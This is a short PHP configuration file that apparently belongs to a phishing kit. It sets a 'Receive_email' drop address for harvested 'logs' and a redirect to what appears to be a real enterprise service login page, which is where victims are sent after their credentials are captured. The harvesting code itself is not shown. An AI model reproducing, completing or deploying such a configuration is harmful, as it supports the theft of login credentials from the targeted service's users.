<?php 
$Receive_email="logs@filedownloadregister.com";
$redirect="https://service.imsbiz.com/LoginPage/login_en.jsp?code=0&utm_source=hktenterprise";
?>